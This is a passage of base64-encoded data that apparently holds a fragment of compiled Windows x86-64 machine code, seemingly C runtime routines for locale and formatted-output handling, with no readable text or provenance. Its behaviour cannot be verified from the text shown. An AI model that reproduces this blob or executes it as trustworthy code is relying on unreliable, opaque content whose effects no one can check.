iLB0iLy2ZEOSB0B+hw9///6wXoGfj//0Q5YxB1N0iNDVxEAQBMi8O6QAAAAOiv/v//hcB0FUiLB0iLy2ZEOSAPhCIBAADoNvf//0Q5YxAPhGYBAABJjY4AAQAASIvT6PH8//+L2IXAD4RNAQAAjYgYAv//g/kBD4Y+AQAAD7fI/xXDpQAAhcAPhC0BAABIhfZ0AokeSIXtD4TDAAAASI21IAEAAEmLz2ZEiSboAM3//02Lx0yNSAG6VQAAAEiLzugIzf//hcAPhScBAABEjUhATIvFugEQAABIi87oQA8AAIXAD4TSAAAASI29gAAAAEG5QAAAALoCEAAATIvHSIvO6BsPAACFwA+ErQAAALpfAAAASIvP6LpSAABIhcB1EI1QLkiLz+iqUgAASIXAdBlBuUAAAABMi8dIi85BjVHH6NwOAACFwHRyQbkKAAAASI2VAAEAAIvLRY1BBujcTwAAuAEAAADrVejE9v//6dn+//+BSxAEAQAASI1MJDC6VQAAAOhhDwAAg/gBD466/v//SI1MJDDoFsz//0yNRCQwulUAAABMjUgBSYvP6BzM//+FwA+Ekv7//+skM8BIi4wk4AAAAEgzzOhk0/7/SIHE8AAAAEFfQV5BXF9eXVvDRTPJRTPAM9IzyUyJZCQg6D4G///MRTPJRTPAM9IzyUyJZCQg6CkG///MSIlcJBBIiWwkGEiJdCQgV0iB7CABAABIiwVKxgEASDPESImEJBABAABIi9noAzj//0iL6Oj7N///SIvLSIu4cAQAAOi8BQAAi41cAQAA99lMjUQkIEG58AAAABvSi8iL8IHiBfD//4HCAhAAAP8VxaEAADPbhcB1B4kfjUMB60NIi41IAQAASI1UJCDof8/+/4XAdSRIjQ2MUQEAZjsxdBj/w0iDwQJIY8NIg/gKcuyDDwSJdwiJdwSLB8HoAvfQg+ABSIuMJBABAABIM8zoVdL+/0yNnCQgAQAASYtbGEmLayBJi3MoSYvjX8NIiVwkCFdIg+wgSIv56DY3//9Ii4hIAQAASIvY6JvK//8z0kiNDer+//9Ig/gDD5TCiZNcAQAAugEAAAD/FfKgAAD2BwR1A4MnAEiLXCQwSIPEIF/DzMzMQFNIg+wggQkEAQAASIvZ/xXPoAAAiUMIiUMESIPEIFvDzMzMSIlcJAhXSIPsIEiL+ei6Nv//SI2YQAEAAEiLC+gfyv//SItLCDPSSIP4Aw+UwolTGOgKyv//M8lIg/gDugIAAAAPlMGJSxyDZwQAg3sYAHUrSIsLRTPJRA+3AUgDykGNQL9mg/gZdgxmQYPoYWZBg/gZdwVB/8Hr3kGL0YlTFEiNDeoAAAC6AQAAAP8VJ6AAAPcHAAEAAHQN9wcAAgAAdAX2Bwd1A4MnAEiLXCQwSIPEIF/DSIlcJAhXSIPsIEiL+egGNv//SIuIQAEAAEiL2Ohryf//M9K5AgAAAEiD+AMPlMKJk1gBAACF0nUvSIuTQAEAAEUzyUQPtwJIA9FBjUC/ZoP4GXYMZkGD6GFmQYP4GXcFQf/B695Bi8mJi1QBAABIjQ13AgAAugEAAAD/FYSfAAD2BwR1A4MnAEiLXCQwSIPEIF/DzEUzwA+3EUiDwQKNQr9mg/gZdgpmg+phZoP6GXcFQf/A6+FBi8DDzMxIiVwkEEiJdCQYSIl8JCBBVkiB7CABAABIiwVxwwEASDPESImEJBABAABIi9noKjX//0iNsEABAADoHjX//0iLy0iLuHAEAADo3wIAAItOHPfZTI1EJCBBufAAAAAb0ovIi9iB4gXw//+BwgIQAAD/FeueAABFM/aFwHUNRIk3uAEAAADpegEAAEiLTghIjVQkIOihzP7/hcAPhawAAACLRhhMjUQkIEG58AAAAPfYi8sb0oHiAvD//4HCARAAAP8Vm54AAIXAdLNIiw5IjVQkIOhizP7/hcB1C4EPBAMAAIlfBOtj9gcCdWFEOXYUdC1MY0YUSIsOSI1UJCDof04AAIXAdRiDDwKJXwhIiw7ovcf//ztGFHUziV8E6y6LD/bBAXUnRYvGSI0VIk4BAGY7GnQYQf/ASIPCAkljwEiD+Apy64PJAYkPiV8Iiwe5AAMAACPBO8EPhJ0AAACLRhhMjUQkIEG58AAAAPfYi8sb0oHiAvD//4HCARAAAP8V3p0AAIXAD4Ty/v//SIsOSI1UJCDoocv+/4XAdSQPui8JRDl2GHVHRDl2FHRBSIsO6B3H//87RhR1NLoBAAAA6x9EOXYYdTREOXYUdC5Iiw5IjVQkIOhgy/7/hcB1HTPSTIvHi8vobAIAAIXAdA0Pui8IRDl3BHUDiV8EiwfB6AL30IPgAUiLjCQQAQAASDPM6D3O/v9MjZwkIAEAAEmLWxhJi3MgSYt7KEmL40Few8zMzEiJXCQQSIl0JBhXSIHsIAEAAEiLBUfBAQBIM8RIiYQkEAEAAEiL2egAM///SI2wQAEAAOj0Mv//SIvLSIu4cAQAAOi1AAAAi04Y99lMjUQkIEG58AAAABvSi8iL2IHiAvD//4HCARAAAP8VwZwAAIXAdQkhB7gBAAAA61tIiw5IjVQkIOh/yv7/hcB1CjlGGHUyjVAB6x+DfhgAdTCDfhQAdCpIiw5IjVQkIOhYyv7/hcB1GTPSTIvHi8voZAEAAIXAdAmDDwSJXwSJXwiLB8HoAvfQg+ABSIuMJBABAABIM8zoOc3+/0yNnCQgAQAASYtbGEmLcyBJi+Nfww+3EUUz0kyLyUWLwus3jUKfTY1JAmaD+AV3B7jZ/wAA6w6NQr9mg/gFdwi4+f8AAGYD0EHB4AQPt8pBD7cRQYPA0EQDwWaF0nXEQYvAw8zMSIlcJBBIiXQkGFdIg+wgM/ZIi/pIi9lIhcl0U2Y5MXROSI0VnEsBAOhn7f//hcB0PkiNFZRLAQBIi8voVO3//4XAdSGLTwhEjU4CTI1EJDC6CwAAIP8ViZsAAIXAdC2LRCQw6zlIi8vot+j+/+svi08ITI1EJDBBuQIAAAC6BBAAIP8VXJsAAIXAdQQzwOsOi0QkMIXAdQb/FVadAABIi1wkOEiLdCRASIPEIF/DzMxFM8lMjQUaSwEAQY1BAWZBOwh0EUQDyEmDwAJJY9FIg/oKcurDM8DDSIlcJBBIiWwkGEiJdCQgV0iD7CCL6ov56Osw//+Lz0yNRCQwQbkCAAAAgeH/AwAAugEAACBIi/APuukK/xXKmgAAM9uFwHUEM8DrRDt8JDB0OYXtdDVIi45AAQAAD7cRSIPBAo1Cv2aD+Bl2CmaD6mFmg/oZdwT/w+viSIuOQAEAAOj1w///O9h0vbgBAAAASItcJDhIi2wkQEiLdCRISIPEIF/DzMzMSIvESIlYCEiJaBBIiXAYSIl4IEFUQVZBV0iD7CAz202L+Iv6TIvhuAEAAACL84XSeEGFwHQ/SYsPjQQ+mSvC0fhIY+hMi/VJweYES4sUJujox/7/hcB1DUmNTCQISQPOSYkP6wp5BY19/+sDjXUBO/d+v4XASItsJEhIi3QkUEiLfCRYD5TDi8NIi1wkQEiDxCBBX0FeQVzDzMzMQFVTVldBVEFWQVdIi+xIg+xASIsF370BAEgzxEiJRfBNi/BMi/pIi/Holi///zPSSI1N4ESNQgxIi/joaOL+/+h/L///SI1N4EUz5EiJiHAEAABIhfZ1DIFN4AQBAADpGgEAAEiNhoAAAABIjZ9IAQAASIm3QAEAAEiJA0iFwHQdZkQ5IHQXixUTSQEASI0NtEUBAEyLw//K6Mb+//9EiWXgSIuHQAEAAEiFwHR5ZkQ5IHRzSIsDSIXAdBFmRDkgdAtIjU3g6C34///rCUiNTeDo1vj//0Q5ZeAPhbQAAACLFbZIAQBMjYdAAQAASI0NFDkBAP/K6Gn+//+FwA+EhwAAAEiLA0iFwHQRZkQ5IHQLSI1N4Oje9///625IjU3g6If4///rY0iLA0iFwHRIZkQ5IHRC6Iou//9Ii9hIi4hIAQAA6O/B//9Bi8y6AQAAAEiD+AMPlMGJi1wBAABIjQ0r9v///xVFmAAA9kXgBHUZRIll4OsTx0XgBAEAAP8VNJgAAIlF5IlF6EQ5ZeAPhOUAAABIjYYAAQAASPfeSI1V4EgbyUgjyOg3/P//i9iFwA+EwgAAAI2IGAL//4P5AQ+GswAAAA+3yP8VAZoAAIXAD4SiAAAAi03kugEAAAD/FduXAACFwA+EjAAAAE2F/3QDQYkfi03kSI2XmAMAAL9VAAAARIvH6OwBAABNhfZ0YYtN5EmNliABAABEi8fo1QEAAItN5L9AAAAARIvPTYvGugEQAAD/FYyXAACFwHQ5i03oTY2GgAAAAESLz7oCEAAA/xVwlwAAhcB0HUmNlgABAABEjU/KRI1H0IvL6FJEAAC4AQAAAOsCM8BIi03wSDPM6DHI/v9Ig8RAQV9BXkFcX15bXcPMzESL0UUzwEG54wAAAEONBAFMjR0pRwEAQYvKmSvC0fhIY9BIweIEQisMGnQWhcl5BkSNSP/rBESNQAFFO8F+zYPI/8PMSIvESIlYCEiJaBBIiXAYSIl4IEFWSIPsIEiL6TP/vuMAAABMjTUSVQEAjQQ+QbhVAAAASIvNmSvC0fhIY9hIi9NIA9JJixTW6E8EAACFwHQTeQWNc//rA417ATv+fsuDyP/rC0iLw0gDwEGLRMYISItcJDBIi2wkOEiLdCRASIt8JEhIg8QgQV7DzMxMi9xJiVsISYlzEFdIg+xQTIsVIeIBAEGL2UmL+EwzFWy6AQCL8nQqM8BJiUPoSYlD4EmJQ9iLhCSIAAAAiUQkKEiLhCSAAAAASYlDyEH/0ust6OkAAABEi8tMi8eLyIuEJIgAAACL1olEJChIi4QkgAAAAEiJRCQg/xV5lgAASItcJGBIi3QkaEiDxFBfw8xIiVwkCEiJbCQQSIl0JBhXSIPsMElj2EiL8vfB//P//3UIgfkADAAAdQ9IhdJ1BUWFwH8FRYXAeQQzwOtH6F7+//+FwHjzSJhIjS2ZRQEAulUAAABIA8BIi2zFAEiLzeiY5///SIv4hdt+FjvDfcpIi9NMi8VIi87oV77//4XAdRiNRwFIi1wkQEiLbCRISIt0JFBIg8QwX8NIg2QkIABFM8lFM8Az0jPJ6BL5/v/MzEiD7ChIhcl0Iugm/v//hcB4GUiYSD3kAAAAcw9IjQ0NRQEASAPAiwTB6wIzwEiDxCjDzMxFM8Az0kj/JdDfAQBIg+woSIsFteABAEgzBf64AQB0CkUzyUiDxChI/+BIiQ2r3wEASI0NyP///7oBAAAA/xWRlAAASIMlkd8BAABIg8Qow0yL3EmJWwhJiXMQV0iD7EBMixVt4AEASYvZSYv4TDMVqLgBAIvydBtJg2PoAItEJHiJRCQoSItEJHBJiUPYQf/S6yfoNP///0yLy0yLx4vIi0QkeIvWiUQkKEiLRCRwSIlEJCD/FRKUAABIi1wkUEiLdCRYSIPEQF/DzMxIiVwkCEiJdCQQV0iD7CBIiwX63wEAQYvZSYv4SDMFLbgBAIvydAT/0OsV6ND+//9Ei8tMi8eLyIvW/xXgkwAASItcJDBIi3QkOEiDxCBfw0iJXCQISIl0JBBXSIPsMEyLFbLfAQBJi9lJi/hMMxXdtwEAi/J0F4tEJGiJRCQoSItEJGBIiUQkIEH/0usn6G3+//9Mi8tMi8eLyItEJGiL1olEJChIi0QkYEiJRCQg/xX7kwAASItcJEBIi3QkSEiDxDBfw8zMzEiJXCQIV0iD7CBIiwVH3wEAi9pIi/lIMwVrtwEAdAT/0OsT/xUfkwAARIvDSIvXi8joUv3//0iLXCQwSIPEIF/DzMzMSIPsKEiLBRHfAQBIMwUytwEAdAdIg8QoSP/g6NT9//+6AQAAAIvISIPEKEj/JdqSAADMzEyL3EmJWwhJiXMQV0iD7FBMixXZ3gEAQYvZSYv4TDMV7LYBAIvydCozwEmJQ+hJiUPgSYlD2IuEJIgAAACJRCQoSIuEJIAAAABJiUPIQf/S6y3oaf3//0SLy0yLx4vIi4QkiAAAAIvWiUQkKEiLhCSAAAAASIlEJCD/FQGTAABIi1wkYEiLdCRoSIPEUF/DzEUzyUyL0kyL2U2FwHRDTCvaQw+3DBONQb9mg/gZdwRmg8EgQQ+3Eo1Cv2aD+Bl3BGaDwiBJg8ICSf/IdApmhcl0BWY7ynTKD7fCRA+3yUQryEGLwcPMzMxIg+woSIXJdRnoMvr+/8cAFgAAAOh/9f7/SIPI/0iDxCjDTIvBSIsNrNQBADPSSIPEKEj/JYeSAADMzMy5AgAAAOl+xv7/zMyLBeLFAQBEi8IjykH30EQjwEQLwUSJBc3FAQDDSIPsKOg3SP//SIXAdAq5FgAAAOgASf//9gWtxQEAAnQpuRcAAADoF4UAAIXAdAe5BwAAAM0pQbgBAAAAuhUAAEBBjUgC6Hbz/v+5AwAAAOjsxv7/zMzMzEBTSIPsIDPbTYXJdQ5Ihcl1DkiF0nUeM8DrLUiFyXQVSIXSdBBNhcl1BIgZ6+lNhcB1G4gZ6Er5/v+7FgAAAIkY6Jb0/v+Lw0iDxCBbw0yL2UyL0kmD+f91GE0r2EGKAEOIBANJ/8CEwHQqSf/Kde3rI0wrwUOKBBhBiANJ/8OEwHQKSf/KdAVJ/8l16E2FyXUDQYgbTYXSD4V5////SYP5/3UKiFwR/0GNQlDrmogZ6M/4/v+7IgAAAOuDQFVBVEFVQVZBV0iD7FBIjWwkQEiJXUBIiXVISIl9UEiLBYq0AQBIM8VIiUUASIsBRYv4TIviRItwBE2L6UUzwEUzyUGL10mLzDP/6BD8//9IY/CFwHUHM8Dp5gAAAH53M9JIjULgSPf2SIP4AnJoSI0MNkiNQRBIO8F2W0iNDHUQAAAASIH5AAQAAHcxSI1BD0g7wXcKSLjw////////D0iD4PDoZ93+/0gr4EiNXCRASIXbdKHHA8zMAADrE+hZv/7/SIvYSIXAdA/HAN3dAABIg8MQ6wNIi99IhdsPhHT///9Ei85Mi8NBi9dJi8zobPv//4XAdDmLRWBBg8n/M9JIiXwkOEyLw0GLzkiJfCQwhcB1C4l8JChIiXwkIOsJiUQkKEyJbCQg/xVZkAAAi/hIjUvwgTnd3QAAdQXoFsj+/4vHSItNAEgzzeggwP7/SItdQEiLdUhIi31QSI1lEEFfQV5BXUFcXcPMzEiJXCQISIl0JBBXSIPsUEiL8kiL0UiNTCQwSYvZQYv46Ae8/v+LhCSAAAAASI1MJDBMi8tEi8dIi9aJRCQg6FH+//+AfCRIAHQMSItMJECDocgAAAD9SItcJGBIi3QkaEiDxFBfw8zMSIlcJBhVVldBVEFVQVZBV0iNrCQg/v//SIHs4AIAAEiLBbayAQBIM8RIiYXYAQAAM8BIi/FIiUwkaEiL+kiNTahJi9BNi+mJRCRwRIvwiUQkVESL4IlEJEiJRCRgiUQkWIvYiUQkUOhYu/7/6IP2/v9Bg8j/RTPSSIlFgEiF9g+ESwkAAPZGGEBMjQ3MXP7/D4WGAAAASIvO6PKx/v9MjQUXtgEATGPQQY1KAoP5AXYiSYvSSYvKSI0Fnlz+/4PiH0jB+QVMa8pYTAOMyLBrAwDrA02LyEH2QTh/D4XvCAAAQY1CAkyNDXBc/v+D+AF2GUmLykmLwoPhH0jB+AVMa8FYTQOEwbBrAwBB9kA4gA+FuwgAAEGDyP9FM9JIhf8PhKsIAABEij9Bi/JEiVQkQESJVCREQYvSTIlViEWE/w+EowgAAEG7AAIAAEj/x0iJfZiF9g+IbQgAAEGNR+A8WHcSSQ++x0IPtowIMBQDAIPhD+sDQYvKSGPBSI0MwEhjwkgDyEIPtpQJUBQDAMHqBIlUJFyD+ggPhDMIAACLyoXSD4TiBgAA/8kPhPQHAAD/yQ+EnAcAAP/JD4RYBwAA/8kPhEgHAAD/yQ+ECwcAAP/JD4QoBgAA/8kPhQsGAABBD77Pg/lkD49pAQAAD4RbAgAAg/lBD4QvAQAAg/lDD4TMAAAAjUG7qf3///8PhBgBAACD+VN0bYP5WA+ExgEAAIP5WnQXg/lhD4QIAQAAg/ljD4SnAAAA6RwEAABJi0UASYPFCEiFwHQvSItYCEiF23QmD78AQQ+65gtzEpnHRCRQAQAAACvC0fjp5gMAAESJVCRQ6dwDAABIix2NvgEA6cUDAABB98YwCAAAdQVBD7ruC0mLXQBFO+BBi8S5////fw9EwUmDxQhB98YQCAAAD4T9AAAASIXbx0QkUAEAAABID0QdTL4BAEiLy+nWAAAAQffGMAgAAHUFQQ+67gtJg8UIQffGEAgAAHQnRQ+3TfhIjVXQSI1MJERNi8Po5x0AAEUz0oXAdBnHRCRYAQAAAOsPQYpF+MdEJEQBAAAAiEXQSI1d0OkuAwAAx0QkYAEAAABBgMcgQYPOQEiNXdBBi/NFheQPiSECAABBvAYAAADpXAIAAIP5Z37cg/lpD4TqAAAAg/luD4SvAAAAg/lvD4SWAAAAg/lwdGGD+XMPhA////+D+XUPhMUAAACD+XgPhcMCAACNQa/rUf/IZkQ5EXQISIPBAoXAdfBIK8tI0fnrIEiF20gPRB1PvQEASIvL6wr/yEQ4EXQHSP/BhcB18ivLiUwkROl9AgAAQbwQAAAAQQ+67g+4BwAAAIlEJHBBuRAAAABFhPZ5XQRRxkQkTDBBjVHyiEQkTetQQbkIAAAARYT2eUFFC/PrPEmLfQBJg8UI6JzD/v9FM9KFwA+EnQUAAEH2xiB0BWaJN+sCiTfHRCRYAQAAAOlsAwAAQYPOQEG5CgAAAItUJEi4AIAAAESF8HQKTYtFAEmDxQjrOkEPuuYMcu9Jg8UIQfbGIHQZTIlsJHhB9sZAdAdND79F+OscRQ+3RfjrFUH2xkB0Bk1jRfjrBEWLRfhMiWwkeEH2xkB0DU2FwHkISffYQQ+67ghEhfB1CkEPuuYMcgNFi8BFheR5CEG8AQAAAOsLQYPm90U740UPT+NEi2wkcEmLwEiNnc8BAABI99gbySPKiUwkSEGLzEH/zIXJfwVNhcB0IDPSSYvASWPJSPfxTIvAjUIwg/g5fgNBA8WIA0j/y+vRTItsJHhIjYXPAQAAK8NI/8OJRCRERYXzD4QJAQAAhcB0CYA7MA+E/AAAAEj/y/9EJETGAzDp7QAAAHUOQYD/Z3U+QbwBAAAA6zZFO+NFD0/jQYH8owAAAH4mQY28JF0BAABIY8/o0d3+/0iJRYhIhcB0B0iL2Iv36wZBvKMAAABJi0UASIsNMLsBAEmDxQhBD77/SGP2SIlFoP8Vu4kAAEiNTahEi89IiUwkMItMJGBMi8aJTCQoSI1NoEiL00SJZCQg/9BBi/6B54AAAAB0G0WF5HUWSIsN97oBAP8VeYkAAEiNVahIi8v/0EGA/2d1GoX/dRZIiw3PugEA/xVZiQAASI1VqEiLy//QgDstdQhBD7ruCEj/w0iLy+jLrf//RTPSiUQkREQ5VCRYD4VWAQAAQfbGQHQxQQ+65ghzB8ZEJEwt6wtB9sYBdBDGRCRMK78BAAAAiXwkSOsRQfbGAnQHxkQkTCDr6It8JEiLdCRUTIt8JGgrdCREK/dB9sYMdRFMjUwkQE2Lx4vWsSDorAMAAEiLRYBMjUwkQEiNTCRMTYvHi9dIiUQkIOjjAwAAQfbGCHQXQfbGBHURTI1MJEBNi8eL1rEw6HIDAACDfCRQAIt8JER0cIX/fmxMi/tFD7cPSI2V0AEAAEiNTZBBuAYAAAD/z02NfwLouBkAAEUz0oXAdTSLVZCF0nQtSItFgEyLRCRoTI1MJEBIjY3QAQAASIlEJCDoZwMAAEUz0oX/daxMi3wkaOssTIt8JGiDyP+JRCRA6yJIi0WATI1MJEBNi8eL10iLy0iJRCQg6DADAABFM9KLRCRAhcB4GkH2xgR0FEyNTCRATYvHi9axIOi6AgAARTPSSItFiEiFwHQPSIvI6Lq//v9FM9JMiVWISIt9mIt0JECLVCRcQbsAAgAATI0NclX+/0SKP0WE/w+E0QEAAEGDyP/pTPn//0GA/0l0NEGA/2h0KEGA/2x0DUGA/3d100EPuu4L68yAP2x1Ckj/x0EPuu4M671Bg84Q67dBg84g67GKB0EPuu4PPDZ1EYB/ATR1C0iDxwJBD7ruD+uVPDN1EYB/ATJ1C0iDxwJBD7r2D+uALFg8IHcUSLkBEIIgAQAAAEgPo8EPgmb///9EiVQkXEiNVahBD7bPRIlUJFDoJXv//4XAdCFIi1QkaEyNRCRAQYrP6HcBAABEij9I/8dFhP8PhBABAABIi1QkaEyNRCRAQYrP6FYBAABFM9Lp+/7//0GA/yp1GUWLZQBJg8UIRYXkD4n5/v//RYvg6fH+//9HjSSkQQ++x0WNZCToRo0kYOnb/v//RYvi6dP+//9BgP8qdRxBi0UASYPFCIlEJFSFwA+Juf7//0GDzgT32OsRi0QkVI0MgEEPvseNBEiDwNCJRCRU6Zf+//9BgP8gdEFBgP8jdDFBgP8rdCJBgP8tdBNBgP8wD4V1/v//QYPOCOls/v//QYPOBOlj/v//QYPOAela/v//QQ+67gfpUP7//0GDzgLpR/7//0SJVCRgRIlUJFhEiVQkVESJVCRIRYvyRYvgRIlUJFDpI/7//4XSdB2D+gd0GOgf7f7/xwAWAAAA6Gzo/v+DyP9FM9LrAovGRDhVwHQLSItNuIOhyAAAAP1Ii43YAQAASDPM6JK1/v9Ii5wkMAMAAEiBxOACAABBX0FeQV1BXF9eXcPMzMxAU0iD7CD2QhhASYvYdAxIg3oQAHUFQf8A6yX/Sgh4DUiLAogISP8CD7bB6wgPvsnoz0///4P4/3UECQPrAv8DSIPEIFvDzMyF0n5MSIlcJAhIiWwkEEiJdCQYV0iD7CBJi/lJi/CL2kCK6UyLx0iL1kCKzf/L6IX///+DP/90BIXbf+dIi1wkMEiLbCQ4SIt0JEBIg8QgX8PMzMxIiVwkCEiJbCQQSIl0JBhXQVZBV0iD7CBB9kAYQEiLXCRgSYv5RIs7SYvoi/JMi/F0DEmDeBAAdQVBARHrPYMjAIXSfjNBig5Mi8dIi9X/zugP////Sf/Ggz//dRKDOyp1EUyLx0iL1bE/6PX+//+F9n/SgzsAdQNEiTtIi1wkQEiLbCRISIt0JFBIg8QgQV9BXl/DSIlcJBhVVldBVEFVQVZBV0iNrCSg9P//SIHsYAwAAEiLBV6nAQBIM8RIiYVYCwAAM/ZIi/lIiU2YTIviSIlVyEiNTdBJi9BNi+mJdZBEi/6JdCRQiXWMiXQkRIveiXQkaOgGsP7/SIl1gEGDzv9Bi/boJuv+/0iJRahIhf8PhIEAAAD2RxhAD4WMAAAASIvP6KOm/v9MjQXIqgEATGPQQY1KAoP5AXYiSYvSSYvKg+IfSMH5BUxrylhIjRVEUf7/TAOMyrBrAwDrCk2LyEiNFTBR/v9B9kE4f3UpQY1CAoP4AXYZSYvKSYvCg+EfSMH4BUxrwVhMA4TCsGsDAEH2QDiAdBXok+r+/8cAFgAAAOjg5f7/6Q8DAAAz/02F5HUV6Hfq/v/HABYAAADoxOX+/+lgDwAAi89Ei9eJfCRMiUwkfIP5AXUIhfYPhEMPAABIi0XIQYvWTYvMiXwkVEWL5kSJdaBBi/ZEiXQkeESKMESL30iJfbCJVCRAiXwkXIl8JEhFhPYPhNcOAABMY8FMiUQkcEn/wUyJTCRgRYXSD4haDgAAQY1G4DxYdxtIjQ1RUP7/SQ++xg+2jAgwFAMAg+EPRTPS6wZFM9JBi8pIY8FIjQzASWPDQbsBAAAASAPISI0FHVD+/w+2hAFQFAMAwegEiUWIQTvDD4XdAAAAQYA5JQ+E3AAAAIP+/3VeRY1DCUiNVYBJi8nojzUAAEUz0oXAfi9Ii0WAgDgkdSZMOVQkcHUUSI2N8AEAADPSQbhgCQAA6OzJ/v++AQAAAIl0JHjrHUyLRCRwTItMJGBBi/JEiVQkeEG7AQAAAEE783V0SItMJGBIjVWAQbgKAAAA6Cg1AABIi02ATItEJHBEi+BBuwEAAABMjUkBRSvjRTPSTIlMJGBEiWWgTYXAdTZFheQPiF0BAACAOSQPhVQBAABBg/xkD41KAQAAi0QkQEQ74EEPT8SJRCRA6wmD+AgPhDABAACLTYiFyQ+EfwwAAP/JD4RTDAAA/8kPhPgLAAD/yQ+EWgsAAP/JD4RFCwAA/8kPhEoKAAD/yQ+EjwkAAP/JD4W6DAAAQQ++zoP5ZA+PewIAAA+EDAQAAIP5QQ+EDgIAAIP5Qw+EKQEAAI1Bu6n9////D4T3AQAAg/lTD4TiAAAAg/lYD4Q3AwAAg/ladBeD+WEPhN8BAACD+WMPhAABAADplwcAAIX2dQpJi0UASYPFCOshQYP8Y3d4SWPESI0MQE2FwA+EZQIAAEiLhM34AQAASIsASIXAdH1Ii1gISIXbdHQPvwBBD7rnC3NgmUSJXCRoK8LR+Ok9BwAAxwADAAAARIi0zQACAABEibzNBAIAAOkmBwAAugMAAABFi89FisZIi8joyAwAAIXAD4ULBwAA6IPn/v/HABYAAADo0OL+/0GDzv8z/+lmDAAARIlUJGjp4gYAAEiLHXSxAQDpzgYAAEH3xzAIAAB1BUEPuu8Lg///i9e4////fw9E0IX2D4WTAQAASYtdAEmDxQjpwAEAAEH3xzAIAAB1BUEPuu8LQffHEAgAAHR4hfZ1C0UPt00ASYPFCOtHQYP8Yw+Hb////0ljxEiNDEBNhcB1JUiNhfABAABIjQTIRDkQdQvHAAIAAADpGP///7oCAAAA6Sj///9Ii4TN+AEAAEQPtwhIjVXwSI1MJFRBuAACAADomhAAAIXAdEbHRCREAQAAAOs8hfZ1C0EPt0UASYPFCOslQYP8Yw+H9/7//0ljxEiNDEBNhcAPhAgDAABIi4TN+AEAAA+3AIhF8ESJXCRUSI1d8OnWBQAARIkY6ZP+//9EiV2MQYDGIEGDz0BBO/MPhYUEAABNhcAPhXwEAABBg/xjD4eb/v//SWPESI0MQEiNhfABAABIjQTIRDkQD4UyBAAAxwAIAAAARIi0zQACAABEibzNBAIAAOkyCgAAg/lnfqWD+WkPhIkBAACD+W4PhCEBAACD+W8PhAMBAACD+XAPhL0AAACD+XMPhHL+//+D+XUPhGABAACD+XgPhSwFAACNQa/prQAAAEGD/GMPhw/+//9JY8RIjQxATYXAdRlIjYXwAQAASI0EyEQ5EA+Euf3//+nP/f//SIuczfgBAABIixtB98cQCAAAdDFIhdtEiVwkaEgPRB1urwEASIvD6w1BK9NmRDkQdAhIg8AChdJ170grw0jR+OmsBAAASIXbSA9EHTqvAQBIi8PrC0Er00Q4EHQHSQPDhdJ18SvD6YYEAAC/EAAAAEEPuu8PiXwkSLgHAAAAiUWQQbkQAAAARYT/D4mWAAAAQY1R8gRRxkQkWDCJVCRQiEQkWemCAAAAQbkIAAAARYT/eXO4AAIAAEQL+OtphfZ1CkmLfQBJg8UI6yVBg/xjD4cV/f//SWPESI0MQE2FwA+EAv///0iLhM34AQAASIs46E21/v+FwA+E7fz//4tEJExB9scgdAVmiQfrAokHuAEAAACJRCRE6d0DAABBg89AQbkKAAAAi1QkUEEPuucPc0yF9nUNTYtFAEmDxQjpmgEAAEGD/GMPh578//9JY8RIjQxATYXAdWtIjYXwAQAASI0EyEQ5EHULxwAEAAAA6Uf8//+6BAAAAOlX/P//QQ+65wxzT4X2dK1Bg/xjD4dY/P//SWPESI0MQE2FwHUlSI2F8AEAAEiNBMhEORB1C8cABQAAAOkB/P//ugUAAADpEfz//0iLhM34AQAATIsA6QkBAABB9scgD4SRAAAAQfbHQHRVhfZ1Dk0Pv0UASYPFCOnnAAAAQYP8Yw+H6/v//0ljxEiNDEBNhcB1HEiNhfABAABIjQTIRDkQD4QA/f//QYvT6a37//9Ii4TN+AEAAEwPvwDppAAAAIX2dQ5FD7dFAEmDxQjpkgAAAEGD/GMPh5b7//9JY8RIjQxATYXAdKtIi4TN+AEAAEQPtwDrbkH2x0B0NYX2dQpNY0UASYPFCOtaQYP8Yw+HXvv//0ljxEiNDEBNhcAPhG////9Ii4TN+AEAAExjAOszhfZ1CkWLRQBJg8UI6yVBg/xjD4cp+///SWPESI0MQE2FwA+EOv///0iLhM34AQAARIsAQfbHQHQNTYXAeQhJ99hBD7rvCEEPuucPcgpBD7rnDHIDRYvAvgACAACF/3kFQYv76wlBg+f3O/4PT/5Ei2WQSYvASI2d7wEAAEj32BvJI8qJTCRQi89BK/uFyX8FTYXAdCAz0kmLwEljyUj38UyLwI1CMIP4OX4DQQPEiANJK9vr0kSLZaBIjYXvAQAAiXwkSCvDSQPbiUQkVESF/g+EdgEAAIXAdAmAOzAPhGkBAABJK9tEAVwkVMYDMOlZAQAARYrGuggAAABFi89Ii8jo+wYAAIXAD4Qz+v//TItEJHDp8QUAALgAAgAASI1d8Ivwhf95CsdEJEgGAAAA60l1DUGA/md1QUSJXCRI6zo7+A9P+Il8JEiB/6MAAAB+KYHHXQEAAEhjz+jizf7/RTPSSIlFsEiFwHQHSIvYi/frCMdEJEijAAAARDlUJHh1DkmLRQBJg8UISIlFwOsgQYP8Yw+HqPn//0ljxEiNDEBIi4TN+AEAAEiLCEiJTcBIiw0LqwEAQQ++/khj9v8VnnkAAEiNTdBEi89IiUwkMItNjEyLxolMJCiLTCRISIvTiUwkIEiNTcD/0EGL/4HngAAAAHQeM8A5RCRIdRZIiw3VqgEA/xVXeQAASI1V0EiLy//QQYD+Z3Uahf91FkiLDa2qAQD/FTd5AABIjVXQSIvL/9CAOy11CEEPuu8ISP/DSIvL6Kmd//+JRCRUi0QkRIN8JHgBdQ5Mi0QkcE2FwA+EoAQAAIXAD4VNAQAAQfbHQHQxQQ+65whzB8ZEJFgt6wtB9scBdBDGRCRYK78BAAAAiXwkUOsRQfbHAnQHxkQkWCDr6It8JFBEi3QkXEiLdZhEK3QkVEQr90H2xwx1EkyNTCRMTIvGQYvWsSDoqAYAAEiLRahMjUwkTEiNTCRYTIvGi9dIiUQkIOjfBgAAQfbHCHQYQfbHBHUSTI1MJExMi8ZBi9axMOhtBgAAi3wkVDPAOUQkaHRnhf9+Y0iL80QPtw5IjZVQCwAASI1NuEG4BgAAAP/PSI12Auh+CQAAhcB1L4tVuIXSdChIi0WoTItFmEyNTCRMSI2NUAsAAEiJRCQg6GUGAACF/3WzSIt1mOsoSIt1mIPI/4lEJEzrH0iLRahMjUwkTEyLxovXSIvLSIlEJCDoMwYAAItEJEyFwHgYQfbHBHQSTI1MJExMi8ZBi9axIOi/BQAASItFsEiFwHQPSIvI6I6v/v9FM9JMiVWwi3wkSOkz/f//QYD+SXRJQYD+aHQ6QYD+bHQUQYD+dw+FFwMAAEEPuu8L6Q0DAABBgDlsi1QkQHUNTQPLQQ+67wzp+gIAAEGDzxDp8QIAAEGDzyDp5AIAAEGKAbkAgAAARAv5PD